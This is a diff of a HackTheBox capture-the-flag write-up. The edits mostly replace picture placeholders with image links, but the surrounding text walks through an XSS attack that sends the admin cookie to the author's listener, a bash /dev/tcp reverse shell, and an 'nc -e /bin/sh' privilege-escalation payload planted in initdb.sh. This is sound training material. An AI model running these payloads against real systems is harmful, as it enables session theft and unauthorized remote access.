@@ -1,4 +1,4 @@
-Start pinging the target IP:
+![image](https://github.com/3v401/HackTheBox/assets/169607625/34ded9e3-002c-47c4-a13c-f3bcd9c70b81)Start pinging the target IP:
 
 ```
 ping 10.10.11.8
@@ -74,7 +74,7 @@ The purpose of this step is to set up a server (`server1`) to receive the stolen
 python3 -m http.server 8001
 ```
 
-![Alt text](pic13.png)
+![Alt text](pic13-1.png)
 
 ##### 2. Configure Burp-suite scanner
 
@@ -98,13 +98,13 @@ You will see that the URL is reached. Introduce some random data into the webpag
 
 Observe the terms `{IP}:{port}`in the previous command line (CL). The CL is generic and won't work. You have to find your IP address and use the port of the server built in step 1 (server1). To know your IP address type in a new terminal `ifconfig` and you must see your personal IP and the IP assigned to your HTB VPN. The IP from the VPN is the one you have to use. In my situation is `10.10.14.108` so my XSS injection is `<script>var i=new Image(); i.src="http://10.10.14.108:8001/?cookie="+btoa(document.cookie);</script>`.
 
-Introduce this CL into Burp-suite in `User-Agent` field and forward the communication. If no results appear add it too into the `message` field and click on forward.
+Introduce this injection into Burp-suite in `User-Agent` field and forward the communication. If no results appear add it too into the `message` field and click on forward.
 
 ![Alt text](pic9.png)
 
-You will receive the following outcome in your server CLI:
+You will receive the following outcome in your server1 CLI:
 
-(pic13)
+![Alt text](pic13.png)
 
 Congratulations! You got the admin cookie. Now you have to decode it. Your XSS-injection script was encoded in binary 64 to ensure a safe transmission via URL. So now you have to decode it. For that open a new CLI and run: 
 
@@ -113,15 +113,15 @@ echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64
 ```
 The outcome is the decoded admin cookie:
 
-(pic14)
+![Alt text](pic14.png)
 
 Turn off the intercept in Burp-suite, go back the the Burp browser and introduce `http://10.10.11.8:5000/dashboard`. You will access to the Forbidden site. Turn on the intercept and refresh the site. You will observe the following outcome:
 
-(pic15)
+![Alt text](pic15-1.png)
 
 Introduce the following fields: `Cache-Control: max-age=0` and `Cookie: {cokie deciphered}. Click "Forward" and you will get in the Administrator Dashboard.
 
-(pic16)
+![Alt text](pic16-1.png)
 
 In the context of a penetration test or a capture-the-flag (CTF) challenge, the goal is often to gain a shell on the target system (the webserver). This provides deeper access and control over the target, allowing the tester (you) to explore and potentially escalate privileges further. From here the reasoning is the following:
 
@@ -138,6 +138,8 @@ Open a new terminal tab and create a file `vim payload.sh` with the following co
 ```
 
 Make the payload executable with `chmod +x payload.sh`. The content of the payload:
+
+![Alt text](pic16-1-1.png)
 
 1. `/bin/bash -c`: Tells the CLI to run the following command using the bash shell.
 2. `'exec bash -i >& /dev/tcp/{IP}/1111 0>&1'`: The core of the reverse shell command. `exec bash -i` starts an interactive bash shell. `/dev/tcp/` is a Bash feature that allows TCP connections to be treated like files, when a program writes to this path it actually sends data over the network to the specified IP address and port ({IP}/1111). `0>&1` makes the standard input of the Bash shell read from the TCP connection.
@@ -161,6 +163,8 @@ nc -nvlp 1111
 
 `nc`: Starts Netcat. `-n`: Tells Netcat to use numeric-only IP addresses, without attempting DNS resolution. `-v`: Enables verbose mode, to get more detailed output. `-l`: Indicates that Netcat should listen for incoming connections. `-p 1111`: Specifies the port number on which Netcat will listen (port 1111 in this case).
 
+![Alt text](pic16-2.png)
+
 ##### Context of the attack
 
 Once the payload is created, the steps are the following:
@@ -171,24 +175,26 @@ Once the payload is created, the steps are the following:
 
 Let's continue with the situation. Be sure to not to close server1, it must be running in the same directory as payload.sh. Go to `/dashboard` and click on "Submit" to catch the traffic with Burp-suite. Insert `admin cookie` to get privileges and the `command that will fetch the payload` created and run it.
 
-(pic17)
+![Alt text](pic16.png)
 
 You will see the following outcome in server1 and your netcat listener:
 
-(pic18)
-(pic19)
+![Alt text](pic17.png)
+![Alt text](pic18.png)
 
 This means that you accessed the webserver shell. Playing around (moving through folders) you can get the file `user.txt` where the user flag is located.
+
+![Alt text](pic21.png)
 
 #### Root flag
 
 Now is the time to get the `root flag`. Let's see what are the privileges the user logged as default has. Run `sudo -l`. You will get the following outcome:
 
-(pic20)
+![Alt text](pic19.png)
 
 There is a line that states "User dvir may run the following commands on headless". Let's cat that content:
 
-(pic21)
+![Alt text](pic20.png)
 
 `/usr/bin/syscheck` is a system checking script that performs several actions, among them checking if a process named `ìnitdb.sh` is running; if not, it attempts to start it.
 
@@ -198,6 +204,8 @@ Since `syscheck` runs `initdb.sh` script, an attacker might think about exploiti
 echo "nc -e /bin/sh {IP} {port}" > initdb.sh
 chmod +x initdb.sh
 ```
+
+![Alt text](pic21-1.png)
 
 Being {IP} and {port} your IP and port (my port in this case will be 1212). `echo` prints the payload that will be executed by the webserver to return a reverse shell to us. Second line is to make the file executable.
 
@@ -210,7 +218,7 @@ The execution flow is the following:
 
 Open a new listener on the port you indicated in the payload in a new CL. On another CL run again the `syscheck` file as follows:
 
-(pic22)
+![Alt text](pic22.png)
 
 You will see that you don't have root access. This is because the shell is not stabilized yet. When you get a reverse shell from a target machine, it often lacks the features and stability of a regular interactive shell. This means you may not have functionalities like command history, tab completion, or the ability to use certain keyboard shortcuts, which makes it challenging to work efficiently. Stabilizing the shell is the process of converting this basic shell into a more stable and functional interactive shell. To stabilize the shell you need:
 
@@ -221,10 +229,12 @@ You will see that you don't have root access. This is because the shell is not s
 5. Set the terminal emulator to xterm: `export TERM=xterm`
 6. Press `Enter`
 
+![Alt text](pic22-1-1.png)
+
 You will access as root this time. The CLI is as follows:
 
-(pic23)
+![Alt text](pic23.png)
 
 Playing around among folders you will be able to find the root flag.
 
-(pic24)
+![Alt text](pic24.png)
